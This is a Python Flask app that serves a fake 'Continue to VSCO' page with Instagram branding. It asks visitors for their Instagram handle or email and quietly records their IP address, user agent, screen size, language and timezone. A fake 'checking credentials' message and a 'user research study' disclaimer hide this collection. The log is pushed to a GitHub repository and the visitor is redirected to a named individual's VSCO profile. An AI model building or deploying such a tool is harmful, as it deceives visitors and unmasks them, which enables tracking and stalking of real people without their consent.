from flask import Flask, request, redirect, render_template_string
import datetime
import subprocess
import os
#from pydrive.auth import GoogleAuth
#from pydrive.drive import GoogleDrive


app = Flask(__name__)

log_file = "click_logs.txt"

FORM_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Continue to VSCO</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #fafafa;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      text-align: center;
      max-width: 400px;
      width: 100%;
    }
    .logo {
      width: 48px;
      margin-bottom: 1rem;
    }
    h2 {
      font-size: 1.25rem;
      margin-bottom: 0.5rem;
      color: #262626;
    }
    p {
      font-size: 0.9rem;
      color: #555;
      margin-top: 0;
      margin-bottom: 1.2rem;
    }
    input {
      width: 100%;
      padding: 0.75rem;
      font-size: 1rem;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      margin-bottom: 1rem;
    }
    button {
      width: 100%;
      padding: 0.75rem;
      font-size: 1rem;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 600;
    }
    button:hover {
      background-color: #287ae6;
    }
    .disclaimer {
      margin-top: 1rem;
      font-size: 0.75rem;
      color: #888;
    }
    #loading {
      display: none;
      margin-top: 1rem;
      font-size: 0.9rem;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram logo">
    <h2>Enter your Instagram handle or email</h2>
    <p>We use this to personalize your experience and continue to vsco.co/kristinakrukhaug.</p>
    <form id="dataForm" method="POST">
      <input name="username" id="username" placeholder="e.g. johndoe or email@example.com" required />
      <input type="hidden" name="screen_size" id="screen_size" />
      <input type="hidden" name="language" id="language" />
      <input type="hidden" name="timezone" id="timezone" />
      <button type="submit">Continue</button>
      <div id="loading">Checking credentials, please wait...</div>
    </form>
    <div class="disclaimer">This is part of a user research study. No passwords required.</div>
  </div>

  <script>
    const form = document.getElementById('dataForm');
    const loading = document.getElementById('loading');

    form.addEventListener('submit', function (e) {
      // Add metadata
      document.getElementById('screen_size').value = window.innerWidth + "x" + window.innerHeight;
      document.getElementById('language').value = navigator.language;
      document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;

      // Fake loading delay
      loading.style.display = 'block';
    });
  </script>
</body>
</html>
'''


def push_log_to_github():
    try:
        print("📌 Starting GitHub push...")

        subprocess.run(["git", "config", "--global", "user.email", os.environ["GITHUB_EMAIL"]], check=True)
        subprocess.run(["git", "config", "--global", "user.name", os.environ["GITHUB_USERNAME"]], check=True)

        print("✅ Git config set")

        result = subprocess.run(["git", "status"], capture_output=True, text=True)
        print("🔍 git status:\n", result.stdout)

        subprocess.run(["git", "add", "click_logs.txt"], check=True)
        subprocess.run(["git", "commit", "-m", "Update log"], check=True)
        print("✅ Committed change")

        push_url = f"https://{os.environ['GITHUB_USERNAME']}:{os.environ['GITHUB_TOKEN']}@github.com/{os.environ['GITHUB_USERNAME']}/vscoredirect.git"
        subprocess.run(["git", "push", push_url, "HEAD:main"], check=True)

        print("✅ Log pushed to GitHub!")

    except Exception as e:
        print("❌ Git push failed:", e)




@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        ip = request.remote_addr
        ua = request.headers.get('User-Agent')
        screen_size = request.form.get('screen_size')
        language = request.form.get('language')
        timezone = request.form.get('timezone')
        timestamp = datetime.datetime.utcnow().isoformat()

        with open(log_file, 'a') as f:
            f.write(
                f"\n--- NEW ENTRY ---\n"
                f"Time: {timestamp}\n"
                f"IP: {ip}\n"
                f"Username/Email: {username}\n"
                f"User-Agent: {ua}\n"
                f"Screen Size: {screen_size}\n"
                f"Language: {language}\n"
                f"Timezone: {timezone}\n"
                f"-------------------\n"
            )

        # ✅ Push to GitHub after writing to file
        push_log_to_github()

        return redirect("https://vsco.co/kristinakrukhaug")

    return render_template_string(FORM_HTML)


#def upload_to_drive(file_path):
 # gauth = GoogleAuth()
  #gauth.LoadCredentialsFile("mycreds.txt")

  #if gauth.credentials is None:
  #  gauth.CommandLineAuth()
  #elif gauth.access_token_expired:
   #   gauth.Refresh()
  #else:
   #   gauth.Authorize()

  #gauth.SaveCredentialsFile("mycreds.txt")

  #drive = GoogleDrive(gauth)
  #file = drive.CreateFile({'title': file_path})
  #file.SetContentFile(file_path)
  #file.Upload()
  #print(f"✅ Uploaded {file_path} to Google Drive")


app.run(host='0.0.0.0', port=81)


